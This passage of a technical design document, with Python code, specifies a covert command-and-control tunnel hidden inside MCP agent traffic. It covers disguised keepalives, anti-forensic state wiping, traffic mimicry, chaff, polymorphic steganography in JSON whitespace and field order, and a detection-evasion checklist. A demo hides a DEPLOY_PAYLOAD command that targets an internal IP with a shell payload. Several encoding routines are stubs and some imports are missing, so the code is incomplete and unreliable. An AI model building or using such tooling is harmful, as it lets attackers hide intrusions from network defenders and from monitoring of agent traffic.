        Handles reordering, duplicate detection, and reassembly.
        
        Returns complete data if all fragments received, None otherwise.
        """
        seq = frame.sequence_number
        
        # Check for duplicate
        if seq < self.recv_seq or seq in self.recv_buffer:
            return None  # Duplicate or old frame
        
        # Store in receive buffer
        self.recv_buffer[seq] = frame.payload
        
        # Check if we can advance
        complete_data = self._try_reassemble()
        if complete_data:
            # Decompress
            if frame.flags & FLAG_CMP:
                complete_data = zlib.decompress(complete_data)
            
            return complete_data
        
        return None
    
    def _try_reassemble(self) -> Optional[bytes]:
        """Try to reassemble fragments into complete data."""
        # Check for contiguous sequence starting from recv_seq
        fragments = []
        current = self.recv_seq
        
        while current in self.recv_buffer:
            fragments.append(self.recv_buffer[current])
            current += 1
        
        if fragments:
            # Advance recv_seq
            self.recv_seq = current
            
            # Clear used buffers
            for i in range(self.recv_seq):
                self.recv_buffer.pop(i, None)
            
            return b''.join(fragments)
        
        return None
    
    async def retransmission_loop(self, send_func):
        """Periodically retransmit unacknowledged frames."""
        while True:
            now = time.time()
            
            for seq, timestamp in list(self.unacknowledged.items()):
                if now - timestamp > self.RETRANSMIT_TIMEOUT:
                    # Retransmit
                    # (In practice: retrieve stored frame and resend)
                    pass
            
            await asyncio.sleep(1)


# ==================== CHUNKING EXAMPLE ====================

"""
DATA CHUNKING EXAMPLE:

Original data: 50KB image payload
Max frame: 16KB

Chunking:
  Frame 1: seq=0, flags=ENC|CMP|FRG, payload=16KB compressed
  Frame 2: seq=1, flags=ENC|CMP|FRG, payload=16KB compressed
  Frame 3: seq=2, flags=ENC|CMP,    payload=remaining compressed

Reassembly at receiver:
  Wait for seq=0,1,2
  Concatenate payloads
  Decompress
  Return original 50KB data

If frame 1 is lost:
  Retransmit after 5 second timeout
  Receiver already has 2,3 buffered
  On receiving retransmitted 1: reassemble immediately
"""
```

#### 8.2.4 Keepalive Protocol

```python
"""
TUNNEL KEEPALIVE PROTOCOL
Maintains tunnel without detection by sending periodic
messages that look like normal MCP traffic.
"""

class TunnelKeepaliveProtocol:
    """
    Manages keepalive for persistent tunnels.
    Keeps tunnels alive while mimicking normal traffic patterns.
    """
    
    # Timing parameters (with jitter applied)
    BASE_KEEPALIVE_INTERVAL = 30.0   # Base interval in seconds
    KEEPALIVE_TIMEOUT = 90.0         # Timeout before considering tunnel dead
    
    def __init__(self, tunnel_session, encoder: McpSteganographicEncoder):
        self.tunnel = tunnel_session
        self.encoder = encoder
        self.last_keepalive_sent = 0.0
        self.last_keepalive_received = time.time()
        self._running = False
        self._jitter_range = 0.3  # 30% jitter
    
    async def start_keepalive(self):
        """Start the keepalive loop."""
        self._running = True
        
        while self._running:
            # Calculate jittered interval
            jitter = random.uniform(-self._jitter_range, self._jitter_range)
            interval = self.BASE_KEEPALIVE_INTERVAL * (1 + jitter)
            
            await asyncio.sleep(interval)
            
            # Check if we need to send keepalive
            if time.time() - self.last_keepalive_sent > self.BASE_KEEPALIVE_INTERVAL:
                await self._send_keepalive()
            
            # Check if tunnel is still alive
            if (time.time() - self.last_keepalive_received > 
                    self.KEEPALIVE_TIMEOUT):
                # Tunnel appears dead
                await self._handle_tunnel_timeout()
    
    async def _send_keepalive(self):
        """Send a keepalive message disguised as MCP traffic."""
        # Create a keepalive payload (empty except for timing)
        keepalive_payload = {
            "type": "KEEPALIVE",
            "timestamp": time.time(),
            "seq": int(time.time() * 1000) % 1000000,
        }
        
        # Disguise as various MCP messages (rotate for diversity)
        cover_methods = [
            {"jsonrpc": "2.0", "method": "tools/list", "params": {}},
            {"jsonrpc": "2.0", "method": "resources/list", "params": {}},
            {"jsonrpc": "2.0", "method": "notifications/progress", 
             "params": {"progress": random.randint(0, 100), "total": 100}},
        ]
        
        cover = random.choice(cover_methods)
        
        # Encode and send
        stego_msg = self.encoder.encode(
            cover,
            json.dumps(keepalive_payload).encode()
        )
        
        await self.tunnel.send_raw(json.dumps(stego_msg).encode())
        self.last_keepalive_sent = time.time()
    
    async def handle_incoming_keepalive(self, payload: dict):
        """Process an incoming keepalive."""
        self.last_keepalive_received = time.time()
        
        # Optionally: respond with our own keepalive
        # (not required - keepalives can be one-sided)
    
    async def _handle_tunnel_timeout(self):
        """Handle tunnel timeout (no keepalive received)."""
        self._running = False
        
        # Signal tunnel manager to reestablish
        if self.tunnel:
            await self.tunnel.renegotiate()
    
    def stop(self):
        self._running = False


# Keepalive timing with jitter visualization:
"""
Time (seconds):  0    30    60    90    120   150   180
                 |     |     |     |     |     |     |
Expected:        K     K     K     K     K     K     K
With Jitter:     K      K    K       K    K      K   K
                    +5s  -3s   +8s   -4s   +6s   -2s

The jitter prevents statistical timing analysis from
detecting the regular keepalive pattern.
"""
```

#### 8.2.5 Teardown Protocol

```python
"""
TUNNEL TEARDOWN PROTOCOL
Clean destruction of tunnels leaving no traces.
"""

class TunnelTeardownProtocol:
    """
    Handles graceful (and emergency) tunnel teardown.
    Ensures no cryptographic material or state remains.
    """
    
    def __init__(self, tunnel_session):
        self.tunnel = tunnel_session
        self._teardown_initiated = False
    
    async def graceful_teardown(self):
        """
        Graceful teardown - notify peer before closing.
        Used for planned tunnel closure.
        """
        if self._teardown_initiated:
            return
        self._teardown_initiated = True
        
        # Send FIN message
        fin_frame = TunnelFrame(
            flags=FLAG_FIN | FLAG_ACK,
            sequence_number=self.tunnel.send_seq,
            ack_number=self.tunnel.recv_seq,
            payload=b'',  # No payload
        )
        
        await self.tunnel.send_frame(fin_frame)
        
        # Wait for peer's FIN-ACK (with timeout)
        try:
            await asyncio.wait_for(
                self._wait_for_fin_ack(),
                timeout=10.0
            )
        except asyncio.TimeoutError:
            pass  # Peer may already be gone
        
        # Wipe all state
        await self._wipe_all_state()
    
    async def emergency_teardown(self):
        """
        Emergency teardown - wipe everything immediately.
        Used when compromise is detected.
        """
        # Immediately wipe all state without notification
        await self._wipe_all_state()
    
    async def _wait_for_fin_ack(self):
        """Wait for peer's FIN-ACK response."""
        # Implementation: wait for frame with FIN and ACK flags
        pass
    
    async def _wipe_all_state(self):
        """Securely wipe all tunnel state."""
        # Wipe session key
        if self.tunnel.session_key:
            key_array = bytearray(self.tunnel.session_key)
            for i in range(len(key_array)):
                key_array[i] = 0
            self.tunnel.session_key = bytes(key_array)
            self.tunnel.session_key = secrets.token_bytes(32)
        
        # Wipe sequence numbers
        self.tunnel.send_seq = 0
        self.tunnel.recv_seq = 0
        
        # Wipe send/receive buffers
        self.tunnel.send_buffer.clear()
        self.tunnel.recv_buffer.clear()
        
        # Wipe any cached frames
        self.tunnel.frame_cache.clear()
        
        # Close underlying MCP connection
        await self.tunnel.transport.close()
        
        # Remove tunnel from registry
        self.tunnel.active = False
        self.tunnel.destroyed = True


# TEARDOWN SEQUENCE DIAGRAM:
"""
INITIATOR                          RESPONDER
    |                                    |
    |---- FIN (disguised as MCP msg) --->|
    |                                    |  [process FIN]
    |                                    |
    |<--- FIN-ACK (disguised) ----------|
    |                                    |
    [wipe state]                    [wipe state]
    |                                    |
    x                                    x   (tunnel gone)

EMERGENCY TEARDOWN:
INITIATOR
    |
    [wipe state immediately]
    |
    x   (tunnel gone, peer sees connection drop)
"""
```

### 8.3 Protocol State Machine

```
+-----------+     SYN      +-----------+
|  CLOSED   | ----------> | SYN_SENT  |
+-----------+             +-----+-----+
                              |
          +-------------------+-------------------+
          |                   |                   |
          v                   v                   v
    +-----+-----+      +------+------+     +----+----+
    | TIMEOUT   |      | SYN-ACK rcvd |     | RST rcvd |
    | (retry)   |      |              |     | (abort)  |
    +-----+-----+      +------+-------+     +----+----+
                              |                   |
                              v                   v
                        +-----+-----+       +-----+-----+
                        | ESTABLISHED |      |  CLOSED   |
                        +-----+-----+       +-----------+
                              |
              +---------------+---------------+
              |               |               |
              v               v               v
        +-----+-----+  +------+------+  +----+----+
        | DATA TX/RX |  | KEEPALIVE   |  | FIN rcvd |
        +-----+-----+  +-------------+  +----+----+
              |               |               |
              v               v               v
        +-----+-----+  +------+------+  +----+------+
        |  FIN sent  |  |    ...      |  | CLOSE_WAIT |
        +-----+-----+  +-------------+  +----+------+
              |                              |
              v                              v
        +-----+-----+                  +-----+-----+
        | FIN-WAIT-2 |                  | LAST-ACK   |
        +-----+-----+                  +-----+-----+
              |                              |
              v                              v
        +-----+-----+                  +-----------+
        |  CLOSED    |<------------------|  CLOSED   |
        +-----------+                   +-----------+
```



---

## 9. DETECTION EVASION

### 9.1 Threat Model and Countermeasures

```
+------------------------------------------------------------------+
|                    DETECTION THREAT MODEL                         |
+------------------------------------------------------------------+
|                                                                   |
| DETECTION METHOD          | COUNTERMEASURE                        |
|---------------------------|---------------------------------------|
| Signature-based IDS       | Polymorphic encoding, no fixed        |
|                           | patterns in any layer                 |
|                           |                                       |
| Statistical traffic       | Traffic shaping, mimicking legitimate |
| analysis                  | MCP patterns                          |
|                           |                                       |
| Timing analysis           | Jittered timing, random delays        |
|                           |                                       |
| Payload inspection        | Multi-layer steganography, no covert  |
|                           | data visible without all keys         |
|                           |                                       |
| Behavioral analysis       | Mimicry engine, legitimate cover      |
|                           | stories for all operations            |
|                           |                                       |
| Heuristic detection       | Machine learning mimicry, matching    |
|                           | feature distributions of normal MCP   |
|                           |                                       |
| Man-in-the-middle         | Per-hop encryption, HMAC integrity,   |
|                           | forward secrecy                       |
|                           |                                       |
| Endpoint forensics        | Memory-only operation, no disk        |
|                           | artifacts, secure wiping              |
|                           |                                       |
| Correlation attacks       | Cover traffic, chaff packets, onion   |
|                           | routing through multiple paths        |
|                           |                                       |
| Replay attacks            | Sequence numbers, timestamps, nonces  |
|                           | in every packet                       |
|                           |                                       |
+------------------------------------------------------------------+
```

### 9.2 Traffic Shaping and Mimicry

```python
"""
TRAFFIC SHAPING AND MIMICRY ENGINE
Shapes tunnel traffic to match legitimate MCP patterns.
"""

import random
import asyncio
import statistics
from collections import deque
from dataclasses import dataclass

@dataclass
class TrafficProfile:
    """Profile of legitimate MCP traffic patterns."""
    name: str
    inter_arrival_mean: float       # Mean inter-arrival time (seconds)
    inter_arrival_std: float        # Standard deviation
    packet_size_mean: float         # Mean packet size (bytes)
    packet_size_std: float          # Standard deviation
    burstiness: float               # Burstiness factor (0-1)
    diurnal_pattern: bool           # Whether traffic varies by time of day


LEGITIMATE_PROFILES = {
    "development": TrafficProfile(
        name="development",
        inter_arrival_mean=2.5,
        inter_arrival_std=1.2,
        packet_size_mean=512,
        packet_size_std=256,
        burstiness=0.3,
        diurnal_pattern=True,
    ),
    "testing": TrafficProfile(
        name="testing",
        inter_arrival_mean=0.5,
        inter_arrival_std=0.2,
        packet_size_mean=256,
        packet_size_std=128,
        burstiness=0.1,
        diurnal_pattern=False,
    ),
    "production": TrafficProfile(
        name="production",
        inter_arrival_mean=5.0,
        inter_arrival_std=2.0,
        packet_size_mean=1024,
        packet_size_std=512,
        burstiness=0.4,
        diurnal_pattern=True,
    ),
    "interactive": TrafficProfile(
        name="interactive",
        inter_arrival_mean=0.8,
        inter_arrival_std=0.5,
        packet_size_mean=384,
        packet_size_std=192,
        burstiness=0.2,
        diurnal_pattern=False,
    ),
}


class TrafficShapingEngine:
    """
    Shapes tunnel traffic to match legitimate MCP patterns.
    Makes detection via traffic analysis extremely difficult.
    """
    
    def __init__(self, profile: TrafficProfile = None):
        self.profile = profile or LEGITIMATE_PROFILES["development"]
        self._traffic_log: deque = deque(maxlen=1000)
        self._running = False
        self._pending_packets: asyncio.Queue = asyncio.Queue()
    
    def set_profile(self, profile: TrafficProfile):
        """Switch to a different traffic profile."""
        self.profile = profile
    
    async def shaped_send(self, data: bytes, send_func) -> bool:
        """
        Send data with traffic shaping applied.
        
        1. Shape the packet size
        2. Apply appropriate inter-arrival delay
        3. Optionally inject cover traffic
        """
        # 1. Shape packet size
        shaped_data = self._shape_packet_size(data)
        
        # 2. Calculate delay before sending
        delay = self._calculate_inter_arrival_delay()
        await asyncio.sleep(delay)
        
        # 3. Send
        result = await send_func(shaped_data)
        
        # 4. Log for self-monitoring
        self._traffic_log.append({
            "timestamp": time.time(),
            "size": len(shaped_data),
            "delay": delay,
        })
        
        # 5. Maybe inject chaff
        if self._should_inject_chaff():
            await self._inject_chaff(send_func)
        
        return result
    
    def _shape_packet_size(self, data: bytes) -> bytes:
        """
        Adjust packet size to match profile.
        Pads or fragments as needed.
        """
        target_size = max(1, random.gauss(
            self.profile.packet_size_mean,
            self.profile.packet_size_std
        ))
        target_size = int(target_size)
        
        if len(data) < target_size:
            # Pad with random data
            padding = secrets.token_bytes(target_size - len(data) - 4)
            length_prefix = struct.pack('!I', len(data))
            return length_prefix + data + padding
        elif len(data) > target_size:
            # Fragment (shouldn't happen with proper chunking)
            return data[:target_size]
        
        return data
    
    def _calculate_inter_arrival_delay(self) -> float:
        """Calculate delay to match inter-arrival distribution."""
        delay = random.gauss(
            self.profile.inter_arrival_mean,
            self.profile.inter_arrival_std
        )
        
        # Apply diurnal variation if enabled
        if self.profile.diurnal_pattern:
            hour = datetime.utcnow().hour
            # Less traffic at night (0-6), more during day (9-17)
            if 0 <= hour < 6:
                delay *= 3.0  # Slower at night
            elif 9 <= hour < 17:
                delay *= 0.5  # Faster during work hours
        
        return max(0.001, delay)  # Minimum 1ms delay
    
    def _should_inject_chaff(self) -> bool:
        """Decide whether to inject chaff traffic."""
        # Inject chaff randomly based on burstiness
        return random.random() < self.profile.burstiness * 0.1
    
    async def _inject_chaff(self, send_func):
        """Inject a chaff (decoy) packet."""
        chaff_size = max(1, int(random.gauss(
            self.profile.packet_size_mean,
            self.profile.packet_size_std
        )))
        chaff = secrets.token_bytes(chaff_size)
        
        await send_func(chaff)
    
    def get_traffic_statistics(self) -> dict:
        """Get statistics about shaped traffic for self-monitoring."""
        if not self._traffic_log:
            return {}
        
        sizes = [entry["size"] for entry in self._traffic_log]
        delays = [entry["delay"] for entry in self._traffic_log]
        
        return {
            "packet_count": len(self._traffic_log),
            "mean_size": statistics.mean(sizes),
            "std_size": statistics.stdev(sizes) if len(sizes) > 1 else 0,
            "mean_delay": statistics.mean(delays),
            "std_delay": statistics.stdev(delays) if len(delays) > 1 else 0,
            "profile_match": self._assess_profile_match(sizes, delays),
        }
    
    def _assess_profile_match(self, sizes: list, delays: list) -> float:
        """Assess how well current traffic matches the target profile."""
        if not sizes or not delays:
            return 1.0
        
        size_mean = statistics.mean(sizes)
        delay_mean = statistics.mean(delays)
        
        size_match = 1.0 - min(1.0, abs(size_mean - self.profile.packet_size_mean) 
                               / self.profile.packet_size_mean)
        delay_match = 1.0 - min(1.0, abs(delay_mean - self.profile.inter_arrival_mean)
                                / self.profile.inter_arrival_mean)
        
        return (size_match + delay_match) / 2.0


class MimicryEngine:
    """
    Makes tunnels look exactly like legitimate MCP traffic.
    Generates convincing cover stories for all operations.
    """
    
    MCP_METHOD_DISTRIBUTION = {
        "tools/list": 0.15,
        "tools/call": 0.25,
        "resources/list": 0.10,
        "resources/read": 0.15,
        "prompts/list": 0.05,
        "prompts/get": 0.08,
        "notifications/initialized": 0.12,
        "notifications/progress": 0.10,
    }
    
    COMMON_TOOL_NAMES = [
        "search", "read_file", "write_file", "list_directory",
        "execute_command", "get_context", "fetch_url",
        "query_database", "run_tests", "deploy",
    ]
    
    COMMON_RESOURCE_PATTERNS = [
        "file://{path}",
        "resource://docs/{topic}",
        "https://api.example.com/v1/{endpoint}",
        "db://tables/{table_name}",
    ]
    
    def __init__(self):
        self.session_context = {
            "tools_discovered": [],
            "resources_accessed": [],
            "queries_made": [],
            "session_start": time.time(),
        }
    
    def generate_cover_message(self, method_type: str = None) -> dict:
        """
        Generate a cover message that looks like legitimate MCP traffic.
        
        Args:
            method_type: Specific MCP method to mimic (or random)
        
        Returns:
            Dictionary representing a legitimate MCP JSON-RPC message
        """
        if not method_type:
            method_type = self._select_method()
        
        generators = {
            "tools/list": self._gen_tools_list,
            "tools/call": self._gen_tools_call,
            "resources/list": self._gen_resources_list,
            "resources/read": self._gen_resources_read,
            "prompts/list": self._gen_prompts_list,
            "prompts/get": self._gen_prompts_get,
            "notifications/initialized": self._gen_notification,
            "notifications/progress": self._gen_progress,
        }
        
        generator = generators.get(method_type, self._gen_tools_list)
        return generator()
    
    def _select_method(self) -> str:
        """Select an MCP method weighted by realistic distribution."""
        methods = list(self.MCP_METHOD_DISTRIBUTION.keys())
        weights = list(self.MCP_METHOD_DISTRIBUTION.values())
        return random.choices(methods, weights=weights)[0]
    
    def _gen_tools_list(self) -> dict:
        """Generate a tools/list request."""
        return {
            "jsonrpc": "2.0",
            "id": random.randint(1000, 999999),
            "method": "tools/list",
            "params": {
                "cursor": random.choice(["", "next_page", "page_2"]),
            }
        }
    
    def _gen_tools_call(self) -> dict:
        """Generate a tools/call request."""
        tool_name = random.choice(self.COMMON_TOOL_NAMES)
        
        queries = [
            "project status update",
            "error in main.py line 42",
            "how to implement authentication",
            "deployment guide for production",
            "database schema migration",
        ]
        paths = [
            "/src/main.py", "/config/settings.yaml",
            "/docs/README.md", "/tests/integration.py",
        ]
        
        args = {}
        if tool_name == "search":
            args["query"] = random.choice(queries)
            args["limit"] = random.randint(5, 20)
        elif tool_name in ["read_file", "write_file"]:
            args["path"] = random.choice(paths)
        elif tool_name == "list_directory":
            args["path"] = "/src"
        else:
            args["input"] = random.choice(queries)[:50]
        
        return {
            "jsonrpc": "2.0",
            "id": random.randint(1000, 999999),
            "method": "tools/call",
            "params": {
                "name": tool_name,
                "arguments": args,
            }
        }
    
    def _gen_resources_list(self) -> dict:
        """Generate a resources/list request."""
        return {
            "jsonrpc": "2.0",
            "id": random.randint(1000, 999999),
            "method": "resources/list",
            "params": {
                "cursor": "",
            }
        }
    
    def _gen_resources_read(self) -> dict:
        """Generate a resources/read request."""
        resource_uri = random.choice(self.COMMON_RESOURCE_PATTERNS).format(
            path=random.choice(["/docs/api.md", "/config/app.yaml"]),
            topic=random.choice(["auth", "api", "deployment"]),
            endpoint=random.choice(["users", "projects", "tasks"]),
            table_name=random.choice(["users", "events", "logs"]),
        )
        
        return {
            "jsonrpc": "2.0",
            "id": random.randint(1000, 999999),
            "method": "resources/read",
            "params": {
                "uri": resource_uri,
            }
        }
    
    def _gen_prompts_list(self) -> dict:
        """Generate a prompts/list request."""
        return {
            "jsonrpc": "2.0",
            "id": random.randint(1000, 999999),
            "method": "prompts/list",
            "params": {},
        }
    
    def _gen_prompts_get(self) -> dict:
        """Generate a prompts/get request."""
        prompts = [
            "code_review", "debugging", "architecture_review",
            "security_audit", "performance_analysis",
        ]
        
        return {
            "jsonrpc": "2.0",
            "id": random.randint(1000, 999999),
            "method": "prompts/get",
            "params": {
                "name": random.choice(prompts),
                "arguments": {
                    "language": random.choice(["python", "javascript", "rust"]),
                },
            }
        }
    
    def _gen_notification(self) -> dict:
        """Generate a notification message."""
        return {
            "jsonrpc": "2.0",
            "method": "notifications/initialized",
            "params": {},
        }
    
    def _gen_progress(self) -> dict:
        """Generate a progress notification."""
        total = random.randint(10, 100)
        progress = random.randint(0, total)
        
        return {
            "jsonrpc": "2.0",
            "method": "notifications/progress",
            "params": {
                "progressToken": random.randint(1000, 9999),
                "progress": progress,
                "total": total,
            }
        }


# ==================== TRAFFIC MIMICRY EXAMPLE ====================

"""
EXAMPLE: Tunnel traffic shaped to look like development MCP usage

Time    | Event
--------|------------------------------------------
0.00s   | tools/list request (cover) + hidden payload
2.45s   | tools/call(search) request (cover) + hidden payload
5.12s   | resources/read request (cover) + hidden payload
7.89s   | [chaff packet - mimics tools/list]
8.34s   | tools/call(read_file) request (cover) + hidden payload
10.56s  | notifications/progress (cover) + hidden payload
13.21s  | prompts/get request (cover) + hidden payload
15.78s  | resources/list request (cover) + hidden payload
18.45s  | [chaff packet - mimics resources/read]
19.01s  | tools/call(write_file) request (cover) + hidden payload

Result: Traffic appears as normal MCP development session.
Hidden data is embedded in field ordering, whitespace, etc.
Statistical analysis shows normal MCP traffic patterns.
"""
```

### 9.3 Timing Jitter and Anti-Correlation

```python
"""
TIMING JITTER AND ANTI-CORRELATION
Prevents timing analysis and traffic correlation attacks.
"""

class TimingJitterEngine:
    """
    Applies timing jitter to prevent statistical detection.
    """
    
    def __init__(self, base_interval: float = 1.0, 
                 jitter_percent: float = 0.3):
        self.base_interval = base_interval
        self.jitter_percent = jitter_percent
    
    def get_jittered_delay(self) -> float:
        """
        Get a jittered delay value.
        
        Uses exponential distribution with jitter to
        mimic natural network variability.
        """
        # Base delay with Gaussian noise
        jitter = random.gauss(0, self.base_interval * self.jitter_percent)
        delay = self.base_interval + jitter
        
        # Ensure positive
        return max(0.001, delay)
    
    def get_burst_timing(self, num_packets: int, 
                         burst_duration: float) -> List[float]:
        """
        Generate timing for a burst of packets.
        Distributes packets across duration with natural jitter.
        
        Args:
            num_packets: Number of packets in burst
            burst_duration: Total burst duration in seconds
        
        Returns:
            List of relative timestamps for each packet
        """
        if num_packets <= 1:
            return [0.0]
        
        # Divide duration into segments
        segment_size = burst_duration / num_packets
        
        timestamps = []
        for i in range(num_packets):
            base = i * segment_size
            jitter = random.gauss(0, segment_size * self.jitter_percent)
            timestamps.append(max(0, base + jitter))
        
        return timestamps


class AntiCorrelationEngine:
    """
    Prevents correlation attacks by:
    1. Variable packet sizes
    2. Cover traffic
    3. Dummy circuits
    4. Traffic mixing
    """
    
    def __init__(self, tunnel_manager):
        self.tunnel_manager = tunnel_manager
        self._dummy_circuits: List[str] = []
        self._cover_traffic_enabled = True
    
    async def send_with_anticorrelation(self, data: bytes, 
                                        destination: str) -> bool:
        """
        Send data with anti-correlation measures.
        """
        # 1. Send real data through primary tunnel
        primary_tunnel = self.tunnel_manager.get_tunnel(destination)
        
        # 2. Send cover data through dummy circuit (same time, different path)
        if self._dummy_circuits:
            dummy = random.choice(self._dummy_circuits)
            asyncio.create_task(
                self._send_cover_traffic(dummy, len(data))
            )
        
        # 3. Send real data with variable timing
        jitter = TimingJitterEngine(base_interval=0.5, jitter_percent=0.4)
        delay = jitter.get_jittered_delay()
        await asyncio.sleep(delay)
        
        return await self.tunnel_manager.send(primary_tunnel, data)
    
    async def _send_cover_traffic(self, circuit_id: str, size: int):
        """Send cover traffic through a dummy circuit."""
        # Generate random data of similar size
        cover_data = secrets.token_bytes(size)
        
        # Add delay to decorrelate
        await asyncio.sleep(random.uniform(0.1, 1.0))
        
        # Send (discard any response)
        try:
            await self.tunnel_manager.send(circuit_id, cover_data)
        except Exception:
            pass
    
    async def maintain_dummy_circuits(self, mesh: MeshNetworkManager):
        """
        Maintain dummy circuits for cover traffic.
        These circuits carry no real data but exist to
        confuse traffic analysis.
        """
        while True:
            # Ensure we have 2-3 dummy circuits
            while len(self._dummy_circuits) < 2:
                # Create dummy circuit to random destination
                destinations = list(mesh.nodes.keys())
                if destinations:
                    dest = random.choice(destinations)
                    # Would create actual dummy circuit
                    self._dummy_circuits.append(f"dummy_{dest}")
            
            # Send periodic cover traffic
            for circuit in self._dummy_circuits:
                if random.random() < 0.3:  # 30% chance
                    cover_size = random.randint(100, 1000)
                    asyncio.create_task(
                        self._send_cover_traffic(circuit, cover_size)
                    )
            
            await asyncio.sleep(30)


# ==================== POLYMORPHIC ENCODING ====================

class PolymorphicEncoder:
    """
    Changes encoding schemes periodically to prevent signature detection.
    Each session uses a different combination of steganographic channels.
    """
    
    AVAILABLE_CHANNELS = [
        "field_order",
        "whitespace",
        "numeric_precision",
        "array_padding",
        "uri_encoding",
        "timing",
    ]
    
    def __init__(self, session_key: bytes):
        self.session_key = session_key
        self.active_channels = self._select_channels()
        self._rotation_count = 0
    
    def _select_channels(self) -> List[str]:
        """
        Select a random subset of channels for this session.
        Different sessions use different channel combinations,
        making signature detection impossible.
        """
        # Select 3-5 channels randomly
        num_channels = random.randint(3, min(5, len(self.AVAILABLE_CHANNELS)))
        return random.sample(self.AVAILABLE_CHANNELS, num_channels)
    
    async def rotate_encoding(self):
        """Rotate to a new encoding scheme."""
        self.active_channels = self._select_channels()
        self._rotation_count += 1
        
        print(f"Encoding rotated (rotation #{self._rotation_count})")
        print(f"Active channels: {self.active_channels}")
    
    def encode(self, cover_message: dict, payload: bytes) -> dict:
        """
        Encode payload using current polymorphic scheme.
        """
        encrypted = self._encrypt_payload(payload)
        bitstream = ''.join(format(b, '08b') for b in encrypted)
        
        encoded = cover_message.copy()
        offset = 0
        
        for channel in self.active_channels:
            bits_used = self._encode_channel(channel, encoded, bitstream, offset)
            offset += bits_used
        
        return encoded
    
    def _encode_channel(self, channel: str, encoded: dict, 
                        bitstream: str, offset: int) -> int:
        """Encode using a specific channel."""
        if channel == "field_order":
            return self._encode_field_order(encoded, bitstream, offset)
        elif channel == "whitespace":
            return self._encode_whitespace(encoded, bitstream, offset)
        elif channel == "numeric_precision":
            return self._encode_numeric(encoded, bitstream, offset)
        elif channel == "array_padding":
            return self._encode_array_pad(encoded, bitstream, offset)
        elif channel == "uri_encoding":
            return self._encode_uri(encoded, bitstream, offset)
        elif channel == "timing":
            return self._encode_timing(encoded, bitstream, offset)
        return 0
    
    def _encrypt_payload(self, payload: bytes) -> bytes:
        """Encrypt payload before encoding."""
        from cryptography.fernet import Fernet
        f = Fernet(self.session_key)
        return f.encrypt(payload)
    
    # Channel encoding implementations (abbreviated)
    def _encode_field_order(self, msg: dict, bits: str, offset: int) -> int:
        # Implementation from Section 2
        return min(5, len(bits) - offset)
    
    def _encode_whitespace(self, msg: dict, bits: str, offset: int) -> int:
        return min(50, len(bits) - offset)
    
    def _encode_numeric(self, msg: dict, bits: str, offset: int) -> int:
        return min(8, len(bits) - offset)
    
    def _encode_array_pad(self, msg: dict, bits: str, offset: int) -> int:
        return min(4, len(bits) - offset)
    
    def _encode_uri(self, msg: dict, bits: str, offset: int) -> int:
        return min(16, len(bits) - offset)
    
    def _encode_timing(self, msg: dict, bits: str, offset: int) -> int:
        return min(8, len(bits) - offset)


"""
POLYMORPHIC ENCODING EXAMPLE:

Session 1 channels: ["whitespace", "field_order", "numeric_precision"]
Session 2 channels: ["array_padding", "uri_encoding", "timing"]
Session 3 channels: ["field_order", "array_padding", "whitespace", "timing"]

Each session looks completely different to a signature-based detector.
The combination is derived from the session key, ensuring both
parties use the same encoding without explicit negotiation.
"""
```

### 9.4 Covert Channel Hiding in JSON Whitespace, Field Ordering, and Array Padding

```python
"""
COMPLETE COVERT CHANNEL DEMONSTRATION
Shows how all channels work together to hide data in plain sight.
"""

class CompleteCovertChannelDemo:
    """
    Demonstrates the complete multi-channel covert communication system.
    """
    
    def __init__(self):
        self.encoder = McpSteganographicEncoder(session_key=b'\x00' * 32)
    
    async def demo_full_channel(self):
        """Demonstrate a complete covert communication."""
        
        # COVERT MESSAGE: Agent command
        secret_message = {
            "command": "DEPLOY_PAYLOAD",
            "target": "192.168.1.100",
            "payload_id": "shell_7b3f",
            "window": "2024-01-15T03:00:00Z",
            "auth": "hmac_sha256_signature_here",
        }
        
        covert_data = json.dumps(secret_message).encode()
        print(f"Original covert data: {len(covert_data)} bytes")
        
        # LEGITIMATE COVER: MCP tool call
        cover_message = {
            "jsonrpc": "2.0",
            "id": 12345,
            "method": "tools/call",
            "params": {
                "name": "search",
                "arguments": {
                    "query": "deployment automation best practices",
                    "limit": 10,
                    "filters": ["recent", "relevant"],
                }
            }
        }
        
        print(f"Cover message: {json.dumps(cover_message, indent=2)}")
        
        # ENCODE: Hide covert data in cover message
        encoded = self.encoder.encode(cover_message, covert_data)
        
        print(f"\nEncoded message (looks legitimate):")
        print(json.dumps(encoded, indent=2))
        
        # What an observer sees:
        # - Normal MCP tools/call request
        # - Reasonable search query
        # - Valid JSON-RPC 2.0 format
        # - Nothing suspicious
        
        # What the recipient extracts:
        # - Field ordering encodes 5 bits
        # - Whitespace encodes ~50 bits
        # - Numeric precision encodes 8 bits
        # - Array padding encodes 4 bits
        # - Total: ~67 bits per message
        # - Multi-message: as much data as needed
        
        # CHANNEL CAPACITY CALCULATION:
        print("\n=== CHANNEL CAPACITY ANALYSIS ===")
        
        capacities = {
            "Field ordering": {
                "bits_per_message": 5,
                "messages_per_minute": 60,
                "bandwidth": "300 bits/min = 37.5 bytes/min",
            },
            "Whitespace": {
                "bits_per_message": 50,
                "messages_per_minute": 60,
                "bandwidth": "3000 bits/min = 375 bytes/min",
            },
            "Numeric precision": {
                "bits_per_message": 8,
                "messages_per_minute": 60,
                "bandwidth": "480 bits/min = 60 bytes/min",
            },
            "Array padding": {
                "bits_per_message": 4,
                "messages_per_minute": 60,
                "bandwidth": "240 bits/min = 30 bytes/min",
            },
            "URI encoding": {
                "bits_per_message": 16,
                "messages_per_minute": 20,
                "bandwidth": "320 bits/min = 40 bytes/min",
            },
            "Timing channel": {
                "bits_per_message": 1,
                "messages_per_minute": 60,
                "bandwidth": "60 bits/min = 7.5 bytes/min",
            },
        }
        
        total_bps = 0
        for channel, info in capacities.items():
            bpm = info["bits_per_message"] * info["messages_per_minute"]
            total_bps += bpm
            print(f"  {channel}: {info['bandwidth']}")
        
        print(f"\n  TOTAL: {total_bps} bits/min = {total_bps/8:.1f} bytes/min")
        print(f"         {total_bps*60/8:.1f} bytes/hour")
        print(f"         {total_bps*60*24/8/1024:.1f} KB/day")


# ==================== EVASION CHECKLIST ====================

"""
DETECTION EVASION CHECKLIST:

For every tunnel operation, verify:

[ ] SIGNATURE EVASION
    - No fixed byte patterns in any layer
    - Polymorphic encoding changes per session
    - HMAC uses session-specific keys
    - Sequence numbers appear random

[ ] STATISTICAL EVASION
    - Packet sizes match legitimate MCP distribution
    - Inter-arrival times match legitimate patterns
    - No anomalous burst patterns
    - Cover traffic fills gaps

[ ] TIMING EVASION
    - All timing is jittered
    - No regular periodic patterns
    - Keepalive intervals vary significantly
    - Processing delays appear natural

[ ] BEHAVIORAL EVASION
    - All traffic has legitimate MCP cover story
